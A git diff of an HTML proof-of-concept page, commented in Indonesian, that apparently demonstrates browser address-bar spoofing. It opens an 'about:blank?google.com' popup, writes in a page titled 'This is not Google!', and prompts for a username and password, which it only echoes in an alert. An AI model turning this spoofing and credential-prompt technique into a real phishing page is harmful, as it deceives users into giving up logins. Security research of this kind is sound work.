@@ -1,25 +1,53 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
   <body>
-    <button onclick="spoof()">Clickkkk to spoof</button>
+    <button id="spawn">CLICK to spoof</button>
 
     <script>
-      function spoof() {
-        // 1. Buka tab baru ke domain target (untuk spoof address bar)
-        let win = window.open("about:blank?.https://www.google.com:1234");
+      function createSpoofWindow() {
+        // Buka about:blank murni (tanpa query aneh)
+        const win = window.open("about:blank?google.com", "_blank");
+        if (!win) { console.warn("Popup blocked"); return; }
 
-        // 2. Tunggu 2 detik sebelum menampilkan prompt palsu
-        setTimeout(function () {
-          document.getElementById("iframe").src =
-            "javascript:let username = prompt('Enter your username');" +
-            "let password = prompt('Enter your password');" +
-            "alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);";
-        }, 3000); // 2000 ms = 2 detik
+        // Tuliskan halaman lengkap termasuk script yang mengikat event secara andal
+        const html = `
+<!doctype html>
+<html>
+  <body style="font-family: Arial, sans-serif; display:flex; flex-direction:column; align-items:center; padding:40px;">
+    <h1>This is not Google!</h1>
+    <button id="loginBtn">Click me</button>
+
+    <script>
+      // Pastikan DOM ready, lalu bind event handler (jangan pakai inline onclick)
+      document.addEventListener('DOMContentLoaded', function () {
+        document.getElementById('loginBtn').addEventListener('click', function () {
+          // prompt() harus dipicu oleh klik pengguna — ini aman di kebanyakan browser
+          try {
+            const username = prompt('Enter your username');
+            const password = prompt('Enter your password');
+            alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
+          } catch (e) {
+            console.error('Dialogs blocked or error:', e);
+          }
+        });
+      });
+    <\/script>
+  </body>
+</html>
+        `;
+
+        // tulis dan close
+        win.document.open();
+        win.document.write(html);
+        win.document.close();
+
+        // coba beri fokus supaya klik berfungsi
+        try { win.focus(); } catch (e) { /* ignore */ }
+
+        return win;
       }
 
-      spoof(); // Auto-run saat halaman dibuka
+      document.getElementById('spawn').addEventListener('click', createSpoofWindow);
     </script>
-
-    <iframe id="iframe" style="display:none;" src=""></iframe>
   </body>
 </html>
